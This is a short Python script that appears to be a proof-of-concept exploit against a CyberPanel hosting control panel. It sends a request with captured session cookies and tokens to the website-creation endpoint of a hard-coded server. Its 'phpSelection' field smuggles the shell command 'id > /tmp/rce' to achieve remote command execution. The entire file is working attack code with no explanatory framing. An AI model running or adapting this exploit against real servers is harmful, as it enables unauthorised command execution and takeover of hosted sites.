import requests

url = "https://95.217.125.210:8090/websites/submitWebsiteCreation"
headers = {
    "Host": "95.217.125.210:8090",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:131.0) Gecko/20100101 Firefox/131.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Referer": "https://95.217.125.210:8090/",
    "Connection": "keep-alive",
    "Cookie": "csrftoken=yWFDXndgjcsNYj7z8IYozbCQUBj4eLjXsG14u1PQay1lrwohlnqLHG5fwTuRC8I0; smtoken=7c09dd03817bdfebcaf0a97be32628c480663479; django_language=en; SignonSession=422tgvnrnd2f97lem1e2q0l76l; AIOHTTP_SESSION=\"gAAAAABnG8rXm2L1JmWTEqI8BGKHlWUvCQLuvN_VXWu-6r25Rk811sSjtcEK1-kuE-TrQTOwmN2K2xianVlqB3d70QcTeuQwH6a8yRfpi1UMDlysd8W10Xk8h4I_H77EFhZ01d05GImBipmznQIrQ54ZUBWt7ygx8JW52DYaG94Rd9slB3CZqpc=\"; sessionid=tsiqhd7qkcqh393qkdy7oteiagb046sl",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Priority": "u=0, i",
    "Pragma": "no-cache",
    "Cache-Control": "no-cache"
}

data = {
    "package": "Default",
    "domainName": "cyberpanel.net",
    "ownerEmail": "cyber@gmail.com",
    "phpSelection": "PHP 7.4; id > /tmp/rce; #",
    "ssl": "on",
    "websiteOwner": "admin",
    "dkimCheck": "0",
    "openBasedir": "on",
    "mailDomain": "0",
    "apacheBackend": "0"
}

response = requests.options(url, headers=headers, json=data, verify=False)

print(response.status_code)
print(response.text)